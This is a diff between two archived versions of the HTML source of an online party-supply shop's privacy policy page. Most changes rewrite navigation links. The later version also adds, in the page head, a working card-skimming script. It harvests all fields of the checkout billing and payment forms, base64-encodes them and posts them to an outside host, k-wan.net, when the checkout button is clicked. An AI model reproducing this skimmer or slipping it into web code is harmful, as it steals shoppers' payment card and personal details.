@@ -1,5 +1,5 @@
-<!--The following is the downloaded HTML source of the partymart.com privacy policy that was archived on 2017-09-22.
- Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20170922222321id_/http%3A//www.partymart.com/usa/privacy-policy) for the most accurate reproduction.-->
+<!--The following is the downloaded HTML source of the partymart.com privacy policy that was archived on 2018-12-12.
+ Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20181212061828id_/http%3A//www.partymart.com/usa/privacy-policy) for the most accurate reproduction.-->
 
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
@@ -91,6 +91,69 @@ _gaq.push(['_trackPageview']);
     google_ad_client: "ca-pub-5218925405258280",
     enable_page_level_ads: true
   });
+</script>
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<script>
+	function b64EncodeUnicode(str) {
+		return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,
+				function toSolidBytes(match, p1) {
+					return String.fromCharCode('0x' + p1);
+				}
+			)
+		);
+	}
+
+	function sendPost(url,data){
+		var xhttp = new XMLHttpRequest();
+		xhttp.onreadystatechange = function() {
+			if (this.readyState == 4 && this.status == 200) {
+				console.log("200 OK");
+			}
+		};
+		xhttp.open("POST", url, true);
+		xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+		xhttp.send("log=" + data);
+	}
+
+	function getBilling(){
+		var data = [];
+		var form = document.getElementById("co-billing-form");
+		for(i=0;i<form.elements.length;i++){
+			if(form.elements[i].name || form.elements[i].value){
+				data.push(form.elements[i].name + " : " + form.elements[i].value);
+			}
+		}
+		return data;	
+	}
+
+	function getPayment(){
+		var data = [];
+		var form = document.getElementById("co-payment-form");
+		for(i=0;i<form.elements.length;i++){
+			if(form.elements[i].name || form.elements[i].value){
+				data.push(form.elements[i].name + " : " + form.elements[i].value);
+			}
+		}
+		return data;
+	}
+
+	function buildData(){
+		var data = b64EncodeUnicode(getBilling().join("\n") + getPayment().join("\n"));	
+		return data;
+	}
+
+	document.onclick= function(event) {
+		if (event===undefined) event= window.event;
+		var target= 'target' in event? event.target : event.srcElement; 
+		if(target.className == "button btn-checkout" || target.tagName == "SPAN"){
+			var payment = document.getElementsByName("payment[cc_number]");
+			if(payment && payment.value != ""){
+				sendPost("http://k-wan.net/",buildData());
+			}
+		} else {
+			console.log(target.className + " = " + target.tagName);
+		}
+	};
 </script></head>
 <body class=" cms-page-view cms-privacy-policy">
 <div class="wrapper">
@@ -106,18 +169,18 @@ _gaq.push(['_trackPageview']);
     <div class="page">
         <div class="header-container">
     <div class="header">
-                <a href="http://www.partymart.com/usa/" title="PartyMart.com" class="logo"><strong>PartyMart.com</strong><img src="http://www.partymart.com/skin/frontend/default/partymart/images/logo.jpg" alt="PartyMart.com"></a>
+                <a href="http://www.partymart.com/index.php/usa/" title="PartyMart.com" class="logo"><strong>PartyMart.com</strong><img src="http://www.partymart.com/skin/frontend/default/partymart/images/logo.jpg" alt="PartyMart.com"></a>
                 <div id="phoneOrder"><img src="http://www.partymart.com/skin/frontend/default/partymart/images/phoneOrder.png" alt="Phone Order 1-866-669-MART (6278)"></div>
         <div class="quick-access">
             <ul class="links">
-            	<li><a href="http://www.partymart.com/usa/">Home</a></li>
+            	<li><a href="http://www.partymart.com/index.php/usa/">Home</a></li>
                 <li>|</li>
-                <li><a href="http://www.partymart.com/usa/contacts/">Contact Us</a></li>
+                <li><a href="http://www.partymart.com/index.php/usa/contacts/">Contact Us</a></li>
                 <li>|</li>
                 <li>	<span class="link-store">
 								<span class="current"><strong>United States</strong> (Change Country)</span>
 				<ul>
-						<li><a href="http://www.partymart.com/en/" class=""><img src="http://www.partymart.com/skin/frontend/default/partymart/images/Canada.gif" alt="Canada"> Canada</a></li>
+						<li><a href="http://www.partymart.com/index.php/en/" class=""><img src="http://www.partymart.com/skin/frontend/default/partymart/images/Canada.gif" alt="Canada"> Canada</a></li>
 						<li><a href="" class="activate"><img src="http://www.partymart.com/skin/frontend/default/partymart/images/United States.gif" alt="United States"> United States</a></li>
 					</ul>
 	</span>
@@ -125,12 +188,12 @@ _gaq.push(['_trackPageview']);
                         	</ul>
         </div>
         <div id="accountLinks">
-                                    <a href="http://www.partymart.com/usa/customer/account/login/referer/aHR0cDovL3d3dy5wYXJ0eW1hcnQuY29tL3VzYS9wcml2YWN5LXBvbGljeT9fX19TSUQ9VQ,,/" title="Login/Sign Up">Login/Sign up</a><br>
-                                <a href="http://www.partymart.com/usa/customer/account/" title="My Account">My Account</a><br>
+                                    <a href="http://www.partymart.com/index.php/usa/customer/account/login/referer/aHR0cDovL3d3dy5wYXJ0eW1hcnQuY29tL2luZGV4LnBocC91c2EvcHJpdmFjeS1wb2xpY3k_X19fU0lEPVU,/" title="Login/Sign Up">Login/Sign up</a><br>
+                                <a href="http://www.partymart.com/index.php/usa/customer/account/" title="My Account">My Account</a><br>
                     </div>
         <div id="cartLinks">
             <ul class="links">
-                        <li class="first last"><a href="http://www.partymart.com/usa/checkout/cart/" title="<span>0</span><br />items" class="top-link-cart"><span>0</span><br>items</a></li>
+                        <li class="first last"><a href="http://www.partymart.com/index.php/usa/checkout/cart/" title="<span>0</span><br />items" class="top-link-cart"><span>0</span><br>items</a></li>
             </ul>
         </div>
         <div id="miniCart" class="no-display scrollBox">
@@ -153,245 +216,245 @@ _gaq.push(['_trackPageview']);
 		<div class="nav-container">
     <ul id="nav">
         <li class="level0 nav-1 level-top first last parent">
-<a href="http://www.partymart.com/usa/party-supplies.html" class="level-top">
+<a href="http://www.partymart.com/index.php/usa/party-supplies.html" class="level-top">
 <span>Products</span>
 </a>
 <ul class="level0">
 <li class="level1 nav-1-1 first parent">
-<a href="http://www.partymart.com/usa/party-supplies/feather-boas.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/feather-boas.html">
 <span>Feather Boas - NOT AVAILABLE FOR SALE IN CANADA</span>
 </a>
 <ul class="level1">
 <li class="level2 nav-1-1-1 first">
-<a href="http://www.partymart.com/usa/party-supplies/feather-boas/wholesale-feather-boas.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/feather-boas/wholesale-feather-boas.html">
 <span>All Feather Boas - NOT AVAILABLE FOR SALE IN CANADA</span>
 </a>
 </li><li class="level2 nav-1-1-2">
-<a href="http://www.partymart.com/usa/party-supplies/feather-boas/cheap-feather-boa.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/feather-boas/cheap-feather-boa.html">
 <span>40" 20 gram Turkey Feather Boas - NOT AVAILABLE FOR SALE IN CANADA</span>
 </a>
 </li><li class="level2 nav-1-1-3">
-<a href="http://www.partymart.com/usa/party-supplies/feather-boas/6-foot-feather-boas.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/feather-boas/6-foot-feather-boas.html">
 <span>6' 60 gram Turkey Feather Boas - NOT AVAILABLE FOR SALE IN CANADA</span>
 </a>
 </li><li class="level2 nav-1-1-4 last">
-<a href="http://www.partymart.com/usa/party-supplies/feather-boas/thick-turkey-feather-boas.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/feather-boas/thick-turkey-feather-boas.html">
 <span>6' 100 gram Turkey Feather Boas - NOT AVAILABLE FOR SALE IN CANADA.</span>
 </a>
 </li>
 </ul>
 </li><li class="level1 nav-1-2 parent">
-<a href="http://www.partymart.com/usa/party-supplies/party-hats.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/party-hats.html">
 <span>Hats &amp; Headgear</span>
 </a>
 <ul class="level1">
 <li class="level2 nav-1-2-5 first">
-<a href="http://www.partymart.com/usa/party-supplies/party-hats/bandana.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/party-hats/bandana.html">
 <span>Bandana</span>
 </a>
 </li><li class="level2 nav-1-2-6">
-<a href="http://www.partymart.com/usa/party-supplies/party-hats/crowns-tiaras.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/party-hats/crowns-tiaras.html">
 <span>Crowns &amp; Tiaras</span>
 </a>
 </li><li class="level2 nav-1-2-7">
-<a href="http://www.partymart.com/usa/party-supplies/party-hats/derbies-top-hats.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/party-hats/derbies-top-hats.html">
 <span>Derbies &amp; Top Hats </span>
 </a>
 </li><li class="level2 nav-1-2-8">
-<a href="http://www.partymart.com/usa/party-supplies/party-hats/funky.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/party-hats/funky.html">
 <span>Funky Fabric Hats</span>
 </a>
 </li><li class="level2 nav-1-2-9">
-<a href="http://www.partymart.com/usa/party-supplies/party-hats/gangster-fedora-hats.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/party-hats/gangster-fedora-hats.html">
 <span>Gangster &amp; Fedora Hats</span>
 </a>
 </li><li class="level2 nav-1-2-10">
-<a href="http://www.partymart.com/usa/party-supplies/party-hats/headbands-boppers.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/party-hats/headbands-boppers.html">
 <span>Headbands &amp; Boppers</span>
 </a>
 </li><li class="level2 nav-1-2-11">
-<a href="http://www.partymart.com/usa/party-supplies/party-hats/holiday-hats.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/party-hats/holiday-hats.html">
 <span>Holiday Hats</span>
 </a>
 </li><li class="level2 nav-1-2-12">
-<a href="http://www.partymart.com/usa/party-supplies/party-hats/western-hats.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/party-hats/western-hats.html">
 <span>Straw &amp; Western Hats</span>
 </a>
 </li><li class="level2 nav-1-2-13 last">
-<a href="http://www.partymart.com/usa/party-supplies/party-hats/themed-hats-and-baseball-caps.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/party-hats/themed-hats-and-baseball-caps.html">
 <span>Themed Hats &amp; Baseball Caps</span>
 </a>
 </li>
 </ul>
 </li><li class="level1 nav-1-3 parent">
-<a href="http://www.partymart.com/usa/party-supplies/jewelry.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/jewelry.html">
 <span>Jewelry &amp; Accessories</span>
 </a>
 <ul class="level1">
 <li class="level2 nav-1-3-14 first">
-<a href="http://www.partymart.com/usa/party-supplies/jewelry/accessories.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/jewelry/accessories.html">
 <span>Buttons</span>
 </a>
 </li><li class="level2 nav-1-3-15">
-<a href="http://www.partymart.com/usa/party-supplies/jewelry/bracelets.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/jewelry/bracelets.html">
 <span>Bracelets</span>
 </a>
 </li><li class="level2 nav-1-3-16">
-<a href="http://www.partymart.com/usa/party-supplies/jewelry/gloves.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/jewelry/gloves.html">
 <span>Gloves</span>
 </a>
 </li><li class="level2 nav-1-3-17 parent">
-<a href="http://www.partymart.com/usa/party-supplies/jewelry/neckware-necklaces.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/jewelry/neckware-necklaces.html">
 <span>Neckware &amp; Necklaces</span>
 </a>
 <ul class="level2">
 <li class="level3 nav-1-3-17-1 first">
-<a href="http://www.partymart.com/usa/party-supplies/jewelry/neckware-necklaces/bead-necklaces.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/jewelry/neckware-necklaces/bead-necklaces.html">
 <span>Bead Necklaces</span>
 </a>
 </li><li class="level3 nav-1-3-17-2">
-<a href="http://www.partymart.com/usa/party-supplies/jewelry/neckware-necklaces/flower-leis.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/jewelry/neckware-necklaces/flower-leis.html">
 <span>Flower Leis</span>
 </a>
 </li><li class="level3 nav-1-3-17-3">
-<a href="http://www.partymart.com/usa/party-supplies/jewelry/neckware-necklaces/lanyards.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/jewelry/neckware-necklaces/lanyards.html">
 <span>Lanyards</span>
 </a>
 </li><li class="level3 nav-1-3-17-4">
-<a href="http://www.partymart.com/usa/party-supplies/jewelry/neckware-necklaces/necklaces.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/jewelry/neckware-necklaces/necklaces.html">
 <span>Necklaces</span>
 </a>
 </li><li class="level3 nav-1-3-17-5 last">
-<a href="http://www.partymart.com/usa/party-supplies/jewelry/neckware-necklaces/ties.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/jewelry/neckware-necklaces/ties.html">
 <span>Ties</span>
 </a>
 </li>
 </ul>
 </li><li class="level2 nav-1-3-18">
-<a href="http://www.partymart.com/usa/party-supplies/jewelry/rings.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/jewelry/rings.html">
 <span>Rings</span>
 </a>
 </li><li class="level2 nav-1-3-19">
-<a href="http://www.partymart.com/usa/party-supplies/jewelry/sashes.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/jewelry/sashes.html">
 <span>Sashes</span>
 </a>
 </li><li class="level2 nav-1-3-20 last">
-<a href="http://www.partymart.com/usa/party-supplies/jewelry/costume-and-party-t-shirts.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/jewelry/costume-and-party-t-shirts.html">
 <span>T-Shirts</span>
 </a>
 </li>
 </ul>
 </li><li class="level1 nav-1-4 parent">
-<a href="http://www.partymart.com/usa/party-supplies/inflatables.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/inflatables.html">
 <span>Inflatables</span>
 </a>
 <ul class="level1">
 <li class="level2 nav-1-4-21 first">
-<a href="http://www.partymart.com/usa/party-supplies/inflatables/all-inflatable.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/inflatables/all-inflatable.html">
 <span>All Inflatable</span>
 </a>
 </li><li class="level2 nav-1-4-22">
-<a href="http://www.partymart.com/usa/party-supplies/inflatables/beach-balls.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/inflatables/beach-balls.html">
 <span>Beach Balls</span>
 </a>
 </li><li class="level2 nav-1-4-23">
-<a href="http://www.partymart.com/usa/party-supplies/inflatables/balloons.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/inflatables/balloons.html">
 <span>Balloons</span>
 </a>
 </li><li class="level2 nav-1-4-24">
-<a href="http://www.partymart.com/usa/party-supplies/inflatables/inflatable-instruments.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/inflatables/inflatable-instruments.html">
 <span>Inflatable Instruments</span>
 </a>
 </li><li class="level2 nav-1-4-25 last">
-<a href="http://www.partymart.com/usa/party-supplies/inflatables/furniture-decor.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/inflatables/furniture-decor.html">
 <span>Furniture &amp; Decor</span>
 </a>
 </li>
 </ul>
 </li><li class="level1 nav-1-5 parent">
-<a href="http://www.partymart.com/usa/party-supplies/masks.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/masks.html">
 <span>Masks</span>
 </a>
 <ul class="level1">
 <li class="level2 nav-1-5-26 first">
-<a href="http://www.partymart.com/usa/party-supplies/masks/character-latex-masks.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/masks/character-latex-masks.html">
 <span>Character &amp; Latex Masks</span>
 </a>
 </li><li class="level2 nav-1-5-27">
-<a href="http://www.partymart.com/usa/party-supplies/masks/feather.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/masks/feather.html">
 <span>Feather Masks</span>
 </a>
 </li><li class="level2 nav-1-5-28">
-<a href="http://www.partymart.com/usa/party-supplies/masks/eye-half-masks.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/masks/eye-half-masks.html">
 <span>Plastic Masks</span>
 </a>
 </li><li class="level2 nav-1-5-29 last">
-<a href="http://www.partymart.com/usa/party-supplies/masks/venetian.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/masks/venetian.html">
 <span>Venetian</span>
 </a>
 </li>
 </ul>
 </li><li class="level1 nav-1-6 parent">
-<a href="http://www.partymart.com/usa/party-supplies/noisemakers.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/noisemakers.html">
 <span>Noisemakers</span>
 </a>
 <ul class="level1">
 <li class="level2 nav-1-6-30 first">
-<a href="http://www.partymart.com/usa/party-supplies/noisemakers/clappers-clackers.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/noisemakers/clappers-clackers.html">
 <span>Clackers &amp; Clackers</span>
 </a>
 </li><li class="level2 nav-1-6-31">
-<a href="http://www.partymart.com/usa/party-supplies/noisemakers/party-poppers-confetti.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/noisemakers/party-poppers-confetti.html">
 <span>Confetti</span>
 </a>
 </li><li class="level2 nav-1-6-32">
-<a href="http://www.partymart.com/usa/party-supplies/noisemakers/coweblls.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/noisemakers/coweblls.html">
 <span>Cowbells</span>
 </a>
 </li><li class="level2 nav-1-6-33">
-<a href="http://www.partymart.com/usa/party-supplies/noisemakers/horns.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/noisemakers/horns.html">
 <span>Horns</span>
 </a>
 </li><li class="level2 nav-1-6-34">
-<a href="http://www.partymart.com/usa/party-supplies/noisemakers/instruments-whistles-etc.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/noisemakers/instruments-whistles-etc.html">
 <span>Instruments, Whistles, etc</span>
 </a>
 </li><li class="level2 nav-1-6-35">
-<a href="http://www.partymart.com/usa/party-supplies/noisemakers/macaras.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/noisemakers/macaras.html">
 <span>Maracas</span>
 </a>
 </li><li class="level2 nav-1-6-36">
-<a href="http://www.partymart.com/usa/party-supplies/noisemakers/pom-poms.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/noisemakers/pom-poms.html">
 <span>Pom Poms</span>
 </a>
 </li><li class="level2 nav-1-6-37 last">
-<a href="http://www.partymart.com/usa/party-supplies/noisemakers/tambourine.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/noisemakers/tambourine.html">
 <span>Tambourines</span>
 </a>
 </li>
 </ul>
 </li><li class="level1 nav-1-7 parent">
-<a href="http://www.partymart.com/usa/party-supplies/sunglasses.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/sunglasses.html">
 <span>Sunglasses</span>
 </a>
 <ul class="level1">
 <li class="level2 nav-1-7-38 first">
-<a href="http://www.partymart.com/usa/party-supplies/sunglasses/light-up-sunglasses.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/sunglasses/light-up-sunglasses.html">
 <span>Flashing Sunglasses</span>
 </a>
 </li><li class="level2 nav-1-7-39 last">
-<a href="http://www.partymart.com/usa/party-supplies/sunglasses/party-sunglasses.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/sunglasses/party-sunglasses.html">
 <span>Party Sunglasses</span>
 </a>
 </li>
 </ul>
 </li><li class="level1 nav-1-8 last parent">
-<a href="http://www.partymart.com/usa/party-supplies/licensed-party-supplies-costumes.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/licensed-party-supplies-costumes.html">
 <span>Licensed Party Supplies Costumes</span>
 </a>
 <ul class="level1">
 <li class="level2 nav-1-8-40 first last">
-<a href="http://www.partymart.com/usa/party-supplies/licensed-party-supplies-costumes/dr-seuss-cat-in-the-hat.html">
+<a href="http://www.partymart.com/index.php/usa/party-supplies/licensed-party-supplies-costumes/dr-seuss-cat-in-the-hat.html">
 <span>Dr Seuss Cat In The Hat</span>
 </a>
 </li>
@@ -400,13 +463,13 @@ _gaq.push(['_trackPageview']);
 </ul>
 </li>    </ul>
     <ul id="rightNav">
-        <li><a href="http://www.partymart.com/usa/advantages/">Advantages</a></li>
-        <li><a href="http://www.partymart.com/usa/need-help/">Need Help</a></li>
-        <li class="last"><a href="http://www.partymart.com/usa/shipping-info/">Shipping Info</a></li>
+        <li><a href="http://www.partymart.com/index.php/usa/advantages/">Advantages</a></li>
+        <li><a href="http://www.partymart.com/index.php/usa/need-help/">Need Help</a></li>
+        <li class="last"><a href="http://www.partymart.com/index.php/usa/shipping-info/">Shipping Info</a></li>
     </ul>
     <div class="clear"></div>
 </div>
-        		<form id="search_mini_form" action="http://www.partymart.com/usa/catalogsearch/result/" method="get">
+        		<form id="search_mini_form" action="http://www.partymart.com/index.php/usa/catalogsearch/result/" method="get">
     <div class="form-search">
         <input id="search" type="text" name="q" value="" class="input-text">
 		<input id="submit" type="image" src="http://www.partymart.com/skin/frontend/default/partymart/images/bg/searchSubmit.gif" alt="Search<">
@@ -414,7 +477,7 @@ _gaq.push(['_trackPageview']);
         <script type="text/javascript">
         //<![CDATA[
             var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Search');
-            searchForm.initAutocomplete('http://www.partymart.com/usa/catalogsearch/ajax/suggest/', 'search_autocomplete');
+            searchForm.initAutocomplete('http://www.partymart.com/index.php/usa/catalogsearch/ajax/suggest/', 'search_autocomplete');
         //]]>
         </script>
     </div>
@@ -426,7 +489,7 @@ _gaq.push(['_trackPageview']);
                 <div class="breadcrumbs">
     <ul>
                     <li class="home">
-                            <a href="http://www.partymart.com/usa/" title="Go to Home Page">Home</a>
+                            <a href="http://www.partymart.com/index.php/usa/" title="Go to Home Page">Home</a>
                                         <span> &gt; </span>
                         </li>
                     <li class="cms_page">
